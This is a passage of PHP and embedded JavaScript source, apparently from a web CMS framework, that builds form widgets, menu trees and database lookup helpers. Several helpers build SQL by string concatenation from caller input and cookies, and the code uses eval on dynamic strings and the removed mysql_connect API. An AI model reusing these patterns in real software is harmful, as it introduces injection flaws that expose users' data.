             tmpv="";
             tmpz="";
             tmpvx=$(slctx[i]).attr("data-value");
             tmpq=qian(tmpvx,"--");
             tmpv=hou(tmpvx,"--");
             eval(tmpq+"="+tmpq+"+\'"+tmpv+",\';");
             eval("tmpz="+tmpq+";");
	         $("#"+tmpq).val(onlyone(tmpz,\',\'));
		  };
		  var tmpcss=$(this).attr("class");
          tmpvb=$(this).attr("data-value");
          tmpbq=qian(tmpvb,"--");
          tmpbv=hou(tmpvb,"--");
		  if (tmpcss.indexOf("selected")>0){
             eval(tmpbq+"="+tmpbq+".replace(\'"+tmpbv+",\',\'\');");
             eval(tmpbq+"="+tmpbq+".replace(\'"+tmpbv+",\',\'\');");
             eval("tmpz="+tmpbq);
             $("#"+tmpbq).val(onlyone(tmpz,\',\'));
             }else{
              eval("tpof=typeof("+tmpbq+");");
              if (tpof=="object"){
               eval(tmpbq+"=\'\';");
              }
             eval(tmpbq+"="+tmpbq+"+\'"+tmpbv+",\';");
             eval("tmpz="+tmpbq+";");
             $("#"+tmpbq).val(onlyone(tmpz,\',\'));
		  };
      });
    });    
	</script>
';
   $_SESSION[$smd5]=$formselects."\r\n".$tmpscpt;
  return $formselects."\r\n".$tmpscpt;//</div>
 };//session
}
function fmradio($txtx,$selectselfname,$selectselfclass,$prev,$ckcode){
$choose="";
 if (strpos("x".$txtx,"|")>0){
   $kk=qian($txtx,"|");
   $pk=explode(",",$kk);
   $totpk=count($pk);
   $vv=hou($txtx,"|");
   $pv=explode(",",$vv);
   $fmiptx="";
  $choose="";
   if ($totpk<=5){
       $fmiptx=$fmiptx."<label id=\"".$selectselfname.$ii."\"><input name=\"".$selectselfname."\" type=\"radio\" class=\"".$selectselfclass."\" value=\"\">NONE</label>";
     for ($ii=0;$ii<$totpk;$ii++){
        if ($pv[$ii]==$prev){
         $fmiptx=$fmiptx."<!--radios--><label id=\"".$selectselfname.$ii."\"><input name=\"".$selectselfname."\" type=\"radio\" class=\"".$selectselfclass."\" checked ".$ckcode." value=\"".$pv[$ii]."\">".$pk[$ii]."</label><!--radioe-->";
        }else{
         $fmiptx=$fmiptx."<!--radios--><label id=\"".$selectselfname.$ii."\"><input name=\"".$selectselfname."\" type=\"radio\" class=\"".$selectselfclass."\"  ".$ckcode." value=\"".$pv[$ii]."\">".$pk[$ii]."</label><!--radioe-->";
        };
      };
   $choose=$fmiptx; 
   }else{
  
   };
   //小于等于5和大于5的
 };
 return $choose;
}

function fmcheck($txtx,$selectselfname,$selectselfclass,$prev,$ckcode){
 $choose="";
 if (strpos("x".$txtx,"/")>0){
   $kk=qian($txtx,"/");
   $pk=explode(",",$kk);
   $totpk=count($pk);
   $vv=hou($txtx,"/");
   $pv=explode(",",$vv);
   $fmiptx="";
   if ($totpk<=5){
      for ($ii=0;$ii<$totpk;$ii++){
         if (strpos(",".$prev.",",",".$pv[$ii].",")>0){
           $fmiptx=$fmiptx."<!--checkboxs--><label id=\"".$selectselfname.$ii."\"><input name=\"".$selectselfname."\" type=\"checkbox\" class=\"".$selectselfclass."\"  checked ".$ckcode." value=\"".$pv[$ii]."\">".$pk[$ii]."</label><!--checkboxe-->";
         }else{
           $fmiptx=$fmiptx."<!--checkboxs--><label id=\"".$selectselfname.$ii."\"><input name=\"".$selectselfname."\" type=\"checkbox\" class=\"".$selectselfclass."\" ".$ckcode." value=\"".$pv[$ii]."\">".$pk[$ii]."</label><!--checkboxe-->";
         };
      };
     $choose=$fmiptx; 
   };
  };
 return $choose;
}
function fmchoose($clstxtx,$prevalue,$selectselfname,$selectselfclass,$htmcod,$ckcod){
$choose="";
  if (strpos($clstxtx,"TYPE_HEX")>0){
    $clstxtx=Hex2String(hou($clstxtx,"TYPE_HEX:")); 
  };
  
 if (strpos("x".$clstxtx,"[")>0 or strpos("x".$clstxtx,"{")>0){
   if (strpos("x".$clstxtx,"[")>0){
     $mark=qian(hou("x".$clstxtx,"["),"]");
   }else{
     $mark=qian(hou("x".$clstxtx,"{"),"}");
   };
   //mark再细分,可以做联动,区分
   if (strpos($mark,"-")>0){
	   $tmplike=hou($mark,"-");
	   $mark=qian($mark,"-");
	   $conn=mysql_connect(gl(),glu(),glp());
       if (strpos("x".$clstxtx,"[")>0){
	     $tmpprv=hou($clstxtx,"]");
       }else{
         $tmpprv=hou($clstxtx,"}");
       };
       $rtn=anyshort($mark,$tmplike,$tmpprv);
   }else{
	   $conn=mysql_connect(gl(),glu(),glp());
       $rtn=anyshort($mark,"","");
   };
   
   if (strpos("x".$clstxtx,"[")>0){
    $xx=formselect(qian($rtn,"|"),hou($rtn,"|"),$prevalue,$selectselfname,$selectselfclass,$htmcod);
   }else{
    $xx="<input type=\"hidden\" id=\"".$selectselfname."\">".formselectx(qian($rtn,"|"),hou($rtn,"|"),$prevalue,$selectselfname,$selectselfclass,$htmcod);
   };
 }else{//非引用
	 if (strpos($clstxtx,"|")>0){
		$tmpis=1;
       $xx=formselect(qian($clstxtx,"|"),hou($clstxtx,"|"),$prevalue,$selectselfname,$selectselfclass,$htmcod);
	 };	  
	 if (strpos($clstxtx,"/")>0){
		$tmpis=2;
       $xx="<input type=\"hidden\" id=\"".$selectselfname."\">".formselectx(qian($clstxtx,"/"),hou($clstxtx,"/"),$prevalue,$selectselfname,$selectselfclass,$htmcod);
	 };	  
 };
  return $xx;
}
function typeimg($fileu,$tp){
   $tmpkzm="js,css,htm,doc,xls,ppt,pdf,txt,rar,zip,mp3,mp4,psd,jpeg,jpg,png,gif,svg,html,xlsx,docx,pptx,";
   $kzhm=hou(hou($fileu,glw()),".");
   if (strpos($tmpkzm,$kzhm.",")>0){
      return "/ORG/BRAIN/images/icon/filetypes/".$kzhm."-".$tp.".svg";
   }else{
      return "/ORG/BRAIN/images/icon/filetypes/svg-b.svg";
   };
}
function duofilex($cdtx,$dval){
  //使用方法 [duofile-b(20x20)]
  //echo "xxxxxxxxxxxx-".$cdtx."------------".$dval;
  $tmpkzm="js,css,htm,doc,xls,ppt,pdf,txt,rar,zip,mp3,mp4,psd,jpg,png,gif,svg,html,xlsx,docx,pptx,";
  if (strpos($dval,",")>0){
     $ptdv=explode(",",$dval);
  };
  if (strpos($dval,";")>0){
     $ptdv=explode(";",$dval);
  };  
  $totp=count($ptdv);
  $kcss=qian($cdtx,"(");
  $kxyz=qian(hou($cdtx,"("),")");//w x h  1024 768 800 600
  $kxyz=str_replace("x",":",$kxyz);
  
  $kw=qian($kxyz,":");
  $kh=hou($kxyz,":");
  $fmxhtm="";
  
  for ($d=0;$d<$totp;$d++){
     $kzm="";
    if ($ptdv[$d]!=""){
      
     $kzm=hou(hou($ptdv[$d],glw()),".");
      
      if (strlen($kzm)<=4 and strlen($kzm)>0){
        if (strpos($tmpkzm,$kzm.",")>0){
          //发现定义域中的扩展名了
          if (strpos("xjpg,jpeg,png,bmp,gif",$kzm)>0){
          	$fmxhtm=$fmxhtm."<a href=\"".$ptdv[$d]."\" target=\"about_blank\"><img src=\"".$ptdv[$d]."\"  width=\"".$kw."px\" height=\"".$kh."px\"></a>";
          }else{
            $fmxhtm=$fmxhtm."<a href=\"".$ptdv[$d]."\" target=\"about_blank\"><img src=\"/ORG/BRAIN/images/icon/filetypes/".$kzm."-".$kcss.".svg"."\" width=\"".$kw."px\" height=\"".$kh."px\"></a>";
          }                    
        }else{
          //没发现定义域中的扩展名
          $fmxhtm=$fmxhtm."<a href=\"".$ptdv[$d]."\" target=\"about_blank\"><img src=\"/ORG/BRAIN/images/icon/filetypes/svg-c.svg"."\" width=\"".$kw."px\" height=\"".$kh."px\"></a>";
        };
      }else{
        //否则位数不够
        // $fmxhtm=$fmxhtm."位数不够！/";
      }
    }else{
      //如果 分割部分没有值
      //$fmxhtm=$fmxhtm."分割部分没有值！/";
    };
  };//for
 return $fmxhtm;  
 // return "duofile-".$cdtx."---".$dval;
}
function anav($kmk,$rvs,$anyvs=array(array())){
  $ptrvs=explode(",",$rvs);
  $ptks=explode(",",$kmk);
  $totptr=count($ptrvs);
  $totptk=count($ptks);
  $fails=0;
  for ($i=0;$i<$totptr-1;$i++){
    $ptkvs=explode("#-#",$ptrvs[$i]);
    $totptkv=count($ptkvs);
    if ($totptk==$totptkv){
      for ($j=0;$j<$totptk;$j++){
        $anyvs[$ptks[$j]][$i]=$ptkvs[$j];
      }
    }else{
      $fails=$fails+1;
    }
  }
  for ($j=0;$j<$totptk;$j++){
      $anyvs["key"][$j]=$ptks[$j];
  }
  $anyvs["result"]["totrcd"]=$totptr-1;
  $anyvs["result"]["totkey"]=$totptk;
  $anyvs["result"]["keys"]=$kmk;
  $anyvs["result"]["result"]=$rvs;
  $anyvs["result"]["fails"]=$fails;
  return $anyvs;
}

function atv($estr){
  //(coode_plotdetail@mysno=:13).key  用=号表示等于  用: 表示like  
  $keyx=hou($estr,").");
  $strx=hou(qian($estr,")."),"(");  
  $tb=qian($strx,"@");
  $extx=hou($strx,"@");
  if ($keyx!="" and $tb!="" and $extx!=""){
    if (strpos($extx,"=")>0){
      $conn=mysql_connect(gl(),glu(),glp());  
      $bkrstx=updatingx($conn,glb(),"select ".$keyx." as result from ".$tb." where ".$extx,"utf8");
    }else{
      $extq=qian($extx,":");
      $exth=hou($extx,":");
      $conn=mysql_connect(gl(),glu(),glp());  
      $bkrstx=updatingx($conn,glb(),"select ".$keyx." as result from ".$tb." where ".$extq." like '%".$exth."%'","utf8");
    }
    return $bkrstx;
  }else{
    return "";
  }
}
function atvs($estr){
  //(coode_plotdetail@mysno=:13).key  用=号表示等于  用: 表示like  
  $keyx=hou($estr,").");
  $strx=hou(qian($estr,")."),"(");  
  $tb=qian($strx,"@");
  $extx=hou($strx,"@");
  if ($keyx!="" and $tb!="" and $extx!=""){
    if (strpos($extx,"=")>0){
      $conn=mysql_connect(gl(),glu(),glp());  
      $bkrstx=selecteds($conn,glb()," select ".$keyx." from ".$tb." where ".$extx,"utf8","");      
    }else{
      $extq=qian($extx,":");
      $exth=hou($extx,":");
      $conn=mysql_connect(gl(),glu(),glp());  
      $bkrstx=selecteds($conn,glb()," select ".$keyx." from ".$tb." where ".$extq." like '%".$exth."%'","utf8","");
    }    
    $bkrstx=hou($bkrstx,"#/#");
    return str_replace("#/#",",",$bkrstx);
  }else{
    return "";
  }
}
function utv($estr){
  //(coode_plotdetail@mysno=:13).key  用=号表示等于  用: 表示like  
  $keyx=qian(hou($estr,")."),"[");
  $strx=hou(qian($estr,")."),"(");  
  $tb=qian($strx,"@");
  $extx=hou($strx,"@");
  $newv=hou($estr,"[");
  $newv=qian($newv,"]");
  if ($keyx!="" and $tb!="" and $extx!="" and $newv!=""){
    if (strpos($extx,"=")>0){
      $conn=mysql_connect(gl(),glu(),glp());  
      $bkrstx=updatingx($conn,glb(),"update ".$tb." set ".$keyx."='".$newv."' where ".$extx,"utf8");
    }else{
      $extq=qian($extx,":");
      $exth=hou($extx,":");
      $bkrstx=updatingx($conn,glb(),"update ".$tb." set ".$keyx."='".$newv."' where ".$extq." like '%".$exth."%'","utf8");
    }
    return $newv;
  }else{
    return "";
  }
}
function newplot($plid,$pltt,$plcls){  
  $czplot=UX("select count(*) as result from coode_plotlist where plotmark='".$plid."'");
 if ($plid!="" and $pltt!="" and $plcls!=""){
  if (intval($czplot)*1==0){
    $xz=UX("insert into coode_plotlist(plotmark,layoutid,plotcls,CRTM,levelcount,totpoint,markname,CRTOR,OLMK,PTOF,VRT,STATUS,STCODE,UPTM,RIP,OPRT)values('".$plid."','coode_plotdetail','syspmt',now(),0,0,'".$pltt."','".$_COOKIE["uid"]."','".onlymark()."','','',1,'',now(),'".getip()."','')");
    return $czplot=UX("select count(*) as result from coode_plotlist where plotmark='".$plid."'");
  }else{
    return 1;
  }
 }else{
   return 0;
 }
}
function fmmymenu($mx=array(),$mnid,$clsid){
 $conn=mysql_connect(gl(),glu(),glp());
 $rst=selecteds($conn,glb(),"select myid,parid,mytitle,mymark,myurl,myclick,mydescrib from coode_plotmydetail where plotmark='".$mnid."'","utf8","");
 $totp=countresult($rst);
 $totq=countresult($rst);
 $totr=countresult($rst);
 $tots=countresult($rst);
  $fmdx="";
 $fmkv="";
  $ttp0=0;
 for ($p=0;$p<$totp;$p++){
  if ( anyvalue($rst,"parid",$p)=="0" or anyvalue($rst,"parid",$p)=="-1"){
   $fmkv=$fmkv."myid".$ttp0.":".$mnid.anyvalue($rst,"myid",$p)."#/#";
   $fmkv=$fmkv."myname".$ttp0.":".anyvalue($rst,"mymark",$p)."#/#";
   $fmkv=$fmkv."mytxt".$ttp0.":".anyvalue($rst,"mytitle",$p)."#/#";
   $fmkv=$fmkv."myurl".$ttp0.":".anyvalue($rst,"myurl",$p)."#/#";
   $fmkv=$fmkv."myclick".$ttp0.":".anyvalue($rst,"myclick",$p)."#/#";
    $fmkv=$fmkv."mydescrib".$ttp0.":".anyvalue($rst,"mydescrib",$p)."#/#";
    $fmkv=$fmkv."mylevel".$ttp0.":".($ttp0+1)."#/#";
   $fmkv=$fmkv."myclass".$ttp0.":".""."#/#";
   $ttp0=$ttp0+1;
   $fmdx=$fmdx."d(";  
   $lv1=anyvalue($rst,"myid",$p);
   $ttp1=0;
   for ($q=0;$q<$totq;$q++){
    if ( anyvalue($rst,"parid",$q)==$lv1){
      $fmkv=$fmkv."myid".($ttp0-1).".".$ttp1.":".$mnid.anyvalue($rst,"myid",$q)."#/#";
      $fmkv=$fmkv."myname".($ttp0-1).".".$ttp1.":".anyvalue($rst,"mymark",$q)."#/#";
      $fmkv=$fmkv."mytxt".($ttp0-1).".".$ttp1.":".anyvalue($rst,"mytitle",$q)."#/#";
      $fmkv=$fmkv."myurl".($ttp0-1).".".$ttp1.":".anyvalue($rst,"myurl",$q)."#/#";
      $fmkv=$fmkv."myclick".($ttp0-1).".".$ttp1.":".anyvalue($rst,"myclick",$q)."#/#";
      $fmkv=$fmkv."mydescrib".($ttp0-1).".".$ttp1.":".anyvalue($rst,"mydescrib",$q)."#/#";
      $fmkv=$fmkv."mylevel".($ttp0-1).".".$ttp1.":".$ttp0.".".($ttp1+1)."#/#";
      $fmkv=$fmkv."myclass".($ttp0-1).".".$ttp1.":".""."#/#";
      $fmdx=$fmdx."d(";  
      $ttp1=$ttp1+1;
      $lv2=anyvalue($rst,"myid",$q);
      $ttp2=0;
       for ($r=0;$r<$totr;$r++){
         if ( anyvalue($rst,"parid",$r)==$lv2){
          $fmkv=$fmkv."myid".($ttp0-1).".".($ttp1-1).".".$ttp2.":".$mnid.anyvalue($rst,"myid",$r)."#/#";
          $fmkv=$fmkv."myname".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mymark",$r)."#/#";
          $fmkv=$fmkv."mytxt".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mytitle",$r)."#/#";
          $fmkv=$fmkv."myurl".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"myurl",$r)."#/#";
          $fmkv=$fmkv."myclick".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"myclick",$r)."#/#";
          $fmkv=$fmkv."mydescrib".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mydescrib",$r)."#/#";
          $fmkv=$fmkv."mylevel".($ttp0-1).".".($ttp1-1).".".$ttp2.":".$ttp0.".".$ttp1.".".($ttp2+1)."#/#";
          $fmkv=$fmkv."myclass".($ttp0-1).".".($ttp1-1).".".$ttp2.":".""."#/#";
          $fmdx=$fmdx."d(";  
         $ttp2=$ttp2+1;
          $lv3=anyvalue($rst,"myid",$r);
         $ttp3=0;
           for ($s=0;$s<$tots;$s++){
             if ( anyvalue($rst,"parid",$s)==$lv3){
               $fmkv=$fmkv."myid".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".$mnid.anyvalue($rst,"myid",$s)."#/#";
               $fmkv=$fmkv."myname".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"mymark",$s)."#/#";
               $fmkv=$fmkv."mytxt".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"mytitle",$s)."#/#";
               $fmkv=$fmkv."myurl".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"myurl",$s)."#/#";
               $fmkv=$fmkv."myclick".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"myclick",$s)."#/#";
               $fmkv=$fmkv."mydescrib".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"mydescrib",$s)."#/#";
               $fmkv=$fmkv."mylevel".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".$ttp0.".".$ttp1.".".$ttp2.".".($ttp3+1)."#/#";
               $fmkv=$fmkv."myclass".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".""."#/#";
               $fmdx=$fmdx."d(";  
               $ttp3=$ttp3+1;
               $lv4=anyvalue($rst,"myid",$s);
               $fmdx=$fmdx.")3,";  
             };//ifs
            };//for s
          $fmdx=$fmdx.")2,";  
          };//if r
        };//for r
     $fmdx=$fmdx.")1,";  
    };//if p==lv1
   };//for q
  $fmdx=$fmdx.")0,";
  };//if totp p==0
 };//for totp
  $conn=mysql_connect(gl(),glu(),glp());
  $mnrst=selecteds($conn,glb(),"select plotmark,markname from coode_plotlist where plotmark='".$mnid."'","utf8","");
  $mntitle=anyvalue($mnrst,"markname",0);
  if ($mntitle!=""){
    $fmkv=$fmkv."mntitle:".$mntitle."#/#";
  }
  $conn=mysql_connect(gl(),glu(),glp());
  $xrst=selecteds($conn,glb(),"select lvone,lvtwo,lvthree,lvfour,srdhtml,stylex,cssfiles,scriptx,jsfiles from coode_commenu where menumark='".$clsid."'","utf8","");
  $jshtml=anyvalue($xrst,"scriptx",0);
  
  if (strpos($jshtml,"TYPE_HEX:")>0){
   $jshtml=Hex2String(hou($jshtml,"TYPE_HEX:"));//str_replace("-r-n","\r\n",str_replace("\\"."'","'",$gphpc));
   $jshtml=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$jshtml));
   if (strpos($jshtml,"script")<=0){
    $jshtml="<script>\r\n".$jshtml."</script>\r\n";
   };
  }
  $csshtml=anyvalue($xrst,"stylex",0);
  if (strpos($csshtml,"TYPE_HEX:")>0){
   $csshtml=Hex2String(hou($csshtml,"TYPE_HEX:"));
   $csshtml=str_replace("-r-n","\r\n",str_replace("\\"."'","'",$csshtml));
  };
  $jslocal=anyvalue($xrst,"jsfiles",0);
  $xhtml=fmtmpmenu($fmdx,$fmkv,tostring(anyvalue($xrst,"srdhtml",0)),tostring(anyvalue($xrst,"lvone",0)),tostring(anyvalue($xrst,"lvtwo",0)),tostring(anyvalue($xrst,"lvthree",0)),tostring(anyvalue($xrst,"lvfour",0)));
//  echo "--------aaaaaa---------------".$fmdx."-------------------------";
//  echo "----------bbbbbb-------------".$fmkv."-------------------------";
  $mx["menujsfile"]=anyvalue($xrst,"jsfiles",0);
  $mx["menujstxt"]=$jshtml;
  $mx["menucssfile"]=anyvalue($xrst,"cssfiles",0);
  $mx["menucsstxt"]=$csshtml;
  $mx["menuhtml"]=$xhtml;
 return $mx;
}

function fmanymenu($mx=array(),$mnid,$clsid){
 $conn=mysql_connect(gl(),glu(),glp());
 $rst=selecteds($conn,glb(),"select myid,parid,mytitle,mymark,myurl,myclick,mydescrib from coode_plotdetail where plotmark='".$mnid."'","utf8","");
 $totp=countresult($rst);
  if ($totp==0){
    $conn=mysql_connect(gl(),glu(),glp());
    $rst=selecteds($conn,glb(),"select myid,parid,mytitle,mymark,myurl,myclick,mydescrib from coode_plotmydetail where plotmark='".$mnid."'","utf8","");
    $totp=countresult($rst);
  }
 $totq=countresult($rst);
 $totr=countresult($rst);
 $tots=countresult($rst);
 $fmdx="";
 $fmkv="";
  $ttp0=0;
 for ($p=0;$p<$totp;$p++){
  if ( anyvalue($rst,"parid",$p)=="0" or  anyvalue($rst,"parid",$p)=="-1"){
   $fmkv=$fmkv."myid".$ttp0.":".$mnid.anyvalue($rst,"myid",$p)."#/#";
   $fmkv=$fmkv."myname".$ttp0.":".anyvalue($rst,"mymark",$p)."#/#";
   $fmkv=$fmkv."mytxt".$ttp0.":".anyvalue($rst,"mytitle",$p)."#/#";
   $fmkv=$fmkv."myurl".$ttp0.":".anyvalue($rst,"myurl",$p)."#/#";
   $fmkv=$fmkv."myclick".$ttp0.":".anyvalue($rst,"myclick",$p)."#/#";
   $fmkv=$fmkv."mylevel".$ttp0.":".($ttp0+1)."#/#";
   $fmkv=$fmkv."mydescrib".$ttp0.":".anyvalue($rst,"mydescrib",$p)."#/#";
   $fmkv=$fmkv."myclass".$ttp0.":".""."#/#";
   $ttp0=$ttp0+1;
   $fmdx=$fmdx."d(";  
   $lv1=anyvalue($rst,"myid",$p);
   $ttp1=0;
   for ($q=0;$q<$totq;$q++){
    if ( anyvalue($rst,"parid",$q)==$lv1){
      $fmkv=$fmkv."myid".($ttp0-1).".".$ttp1.":".$mnid.anyvalue($rst,"myid",$q)."#/#";
      $fmkv=$fmkv."myname".($ttp0-1).".".$ttp1.":".anyvalue($rst,"mymark",$q)."#/#";
      $fmkv=$fmkv."mytxt".($ttp0-1).".".$ttp1.":".anyvalue($rst,"mytitle",$q)."#/#";
      $fmkv=$fmkv."myurl".($ttp0-1).".".$ttp1.":".anyvalue($rst,"myurl",$q)."#/#";
      $fmkv=$fmkv."myclick".($ttp0-1).".".$ttp1.":".anyvalue($rst,"myclick",$q)."#/#";
      $fmkv=$fmkv."mylevel".($ttp0-1).".".$ttp1.":".$ttp0.".".($ttp1+1)."#/#";
      $fmkv=$fmkv."mydescrib".($ttp0-1).".".$ttp1.":".anyvalue($rst,"mydescrib",$q)."#/#";
      $fmkv=$fmkv."myclass".($ttp0-1).".".$ttp1.":".""."#/#";
      $fmdx=$fmdx."d(";  
      $ttp1=$ttp1+1;
      $lv2=anyvalue($rst,"myid",$q);
      $ttp2=0;
       for ($r=0;$r<$totr;$r++){
         if ( anyvalue($rst,"parid",$r)==$lv2){
          $fmkv=$fmkv."myid".($ttp0-1).".".($ttp1-1).".".$ttp2.":".$mnid.anyvalue($rst,"myid",$r)."#/#";
          $fmkv=$fmkv."myname".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mymark",$r)."#/#";
          $fmkv=$fmkv."mytxt".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mytitle",$r)."#/#";
          $fmkv=$fmkv."myurl".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"myurl",$r)."#/#";
          $fmkv=$fmkv."myclick".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"myclick",$r)."#/#";
          $fmkv=$fmkv."mylevel".($ttp0-1).".".($ttp1-1).".".$ttp2.":".$ttp0.".".$ttp1.".".($ttp2+1)."#/#";
          $fmkv=$fmkv."mydescrib".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mydescrib",$r)."#/#";
          $fmkv=$fmkv."myclass".($ttp0-1).".".($ttp1-1).".".$ttp2.":".""."#/#";
          $fmdx=$fmdx."d(";  
         $ttp2=$ttp2+1;
          $lv3=anyvalue($rst,"myid",$r);
         $ttp3=0;
           for ($s=0;$s<$tots;$s++){
             if ( anyvalue($rst,"parid",$s)==$lv3){
               $fmkv=$fmkv."myid".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".$mnid.anyvalue($rst,"myid",$s)."#/#";
               $fmkv=$fmkv."myname".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"mymark",$s)."#/#";
               $fmkv=$fmkv."mytxt".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"mytitle",$s)."#/#";
               $fmkv=$fmkv."myurl".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"myurl",$s)."#/#";
               $fmkv=$fmkv."myclick".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".anyvalue($rst,"myclick",$s)."#/#";
               $fmkv=$fmkv."mydescrib".($ttp0-1).".".($ttp1-1).".".$ttp2.":".anyvalue($rst,"mydescrib",$r)."#/#";
               $fmkv=$fmkv."mylevel".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".$ttp0.".".$ttp1.".".$ttp2.".".($ttp3+1)."#/#";
               $fmkv=$fmkv."myclass".($ttp0-1).".".($ttp1-1).".".($ttp2-1).".".$ttp3.":".""."#/#";
               $fmdx=$fmdx."d(";  
               $ttp3=$ttp3+1;
               $lv4=anyvalue($rst,"myid",$s);
               $fmdx=$fmdx.")3,";  
             };//ifs
            };//for s
          $fmdx=$fmdx.")2,";  
          };//if r
        };//for r
     $fmdx=$fmdx.")1,";  
    };//if p==lv1
   };//for q
  $fmdx=$fmdx.")0,";
  };//if totp p==0
 };//for totp
  $conn=mysql_connect(gl(),glu(),glp());
  $mnrst=selecteds($conn,glb(),"select plotmark,markname from coode_plotlist where plotmark='".$mnid."'","utf8","");
  $mntitle=anyvalue($mnrst,"markname",0);
  if ($mntitle!=""){
    $fmkv=$fmkv."mntitle:".$mntitle."#/#";
  }
  eval(CLASSX("templateupdt"));
  $tup=new templateupdt();
  $mbase=$tup->commenuup($clsid,"view",$mbase);
  $jshtml=$mbase["tmpcode"]["scriptx"];
  $csshtml=$mbase["tmpcode"]["stylex"];
  $jslocal=$mbase["tmpcode"]["jsfiles"];
  $xhtml=fmtmpmenu($fmdx,$fmkv,tostring($mbase["tmpcode"]["srdhtml"]),tostring($mbase["tmpcode"]["lvone"]),tostring($mbase["tmpcode"]["lvtwo"]),tostring($mbase["tmpcode"]["lvthree"]),tostring($mbase["tmpcode"]["lvfour"]));
  //echo "--------aaaaaa---------------".$fmdx."-------------------------";
  //echo "----------bbbbbb-------------".$fmkv."-------------------------";
  $mx["menujsfile"]=$mbase["tmpcode"]["jsfiles"];
  $mx["menujstxt"]=$jshtml;
  $mx["menucssfile"]=$mbase["tmpcode"]["cssfiles"];
  $mx["menucsstxt"]=$csshtml;
  $mx["menuhtml"]=$xhtml;
 return $mx;
}

function fmtmpmenu($frmtxt,$exptxt,$lelsur,$lev1,$lev2,$lev3,$lev4){
 $tmlev=0;
 $fmmntxt="";
if (strpos($frmtxt,")0")>0){
 $ptfrm0=explode(")0",$frmtxt);
 $totlv0=count($ptfrm0);
 for ($p=0;$p<$totlv0-1;$p++){ //lv0
  $fmmntxt=$fmmntxt.$lev1;
  $fmmntxt=str_replace("[myclick]","[myclick".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[mydescrib]","[mydescrib".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[myid]","[myid".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[mytype]","[mytype".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[myname]","[myname".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[mytxt]","[mytxt".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[mylevel]","[mylevel".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[myurl]","[myurl".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[myclass]","[myclass".$p."]",$fmmntxt);
   
  $fmmntxt=str_replace("[mytxt]","[mytxt".$p."]",$fmmntxt);
  $fmmntxt=str_replace("[1linner]","[1linner".$p."]",$fmmntxt);
//  echo "fmmntxt=".$fmmntxt;
  $lv1txt=hou("x".$ptfrm0[$p],"d(");
  $tmlev=1; 
     $tmp1inner="";
  if(strpos($lv1txt,")1")>0){
   $ptfrm1=explode(")1",$lv1txt);
   $totlv1=count($ptfrm1); 

     for ($q=0;$q<$totlv1-1;$q++){ //lv1 ,1分两层就是3层都够了
      $lv2txt=hou("x".$ptfrm1[$p],"d(");
      $tmlev=2; 
      $tmp1inner=$tmp1inner.$lev2;
      $tmp1inner=str_replace("[myclick]","[myclick".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[myid]","[myid".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[mytype]","[mytype".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[myname]","[myname".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[myurl]","[myurl".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[myclass]","[myclass".$p.".".$q."]",$tmp1inner);
       $tmp1inner=str_replace("[mydescrib]","[mydescrib".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[mytxt]","[mytxt".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[mylevel]","[mylevel".$p.".".$q."]",$tmp1inner);
      $tmp1inner=str_replace("[2linner]","[2linner".$p.".".$q."]",$tmp1inner);
       $tmp2inner="";
     if(strpos($lv2txt,")2")>0){
       $ptfrm2=explode(")2",$lv2txt);
       $totlv2=count($ptfrm2);        
      for ($r=0;$r<$totlv2-1;$r++){ //lv2 ,1分两层就是3层都够了
        $lv3txt=hou("x".$ptfrm2[$p],"d(");
        $tmlev=3; 
        $tmp2inner=$tmp2inner.$lev3;
        $tmp2inner=str_replace("[myclick]","[myclick".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[myid]","[myid".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[mytype]","[mytype".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[myname]","[myname".$p.".".$q.".".$r."]",$tmp2inner);
        $tmp2inner=str_replace("[myurl]","[myurl".$p.".".$q.".".$r."]",$tmp2inner);
